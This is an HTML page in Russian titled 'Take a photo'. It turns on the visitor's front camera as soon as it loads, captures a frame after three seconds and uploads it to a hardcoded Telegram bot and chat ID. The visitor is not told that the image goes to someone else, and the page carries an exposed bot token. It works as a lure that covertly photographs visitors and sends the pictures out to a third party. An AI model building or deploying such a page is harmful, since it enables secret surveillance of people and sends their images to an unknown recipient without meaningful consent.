<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сделать фото</title>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = "7992994740:AAGwalP97X8BFhuHYArApCUJS5-NeQV-Sr0";  
        const CHAT_ID = "621679070";  

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                setTimeout(takePhoto, 3000);  
            } catch (error) {
                alert("Ошибка доступа к камере: " + error);
            }
        }

        function takePhoto() {
            if (video.videoWidth === 0 || video.videoHeight === 0) {
                alert("Камера не активирована!");
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                let formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "photo.png");

                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                }).then(response => alert("✅ Фото отправлено в Telegram!"))
                  .catch(error => alert("❌ Ошибка отправки фото! " + error));
            }, "image/png");
        }

        window.onload = startCamera;  
    </script>
</body>
</html>
